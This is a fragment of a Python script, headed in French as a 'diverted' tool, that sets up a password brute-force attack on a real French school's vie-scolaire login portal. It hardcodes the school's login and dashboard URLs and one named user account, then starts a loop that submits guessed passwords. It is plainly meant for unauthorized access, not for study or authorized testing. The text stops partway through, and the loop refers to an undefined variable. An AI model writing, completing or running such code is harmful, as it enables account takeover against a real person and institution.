####################
#Outils detourné vie scolaire#
####################
### Importations ###
import requests

### Constantes ###
login_url = 'https://institutsaintpierresaintpaul28.la-vie-scolaire.fr/vsn.main/WSAuth/connexion'
home_url = 'https://institutsaintpierresaintpaul28.la-vie-scolaire.fr/vsn.main/WSDashboard/afficherDashboard'

### Defintion des fonctions ###
def bruteforce(wordlist):
	username = 'mmautouchet'
	for pswd in pswdl:
	    login_data = {
	        'login': username, 
	        'password': pswd,
	  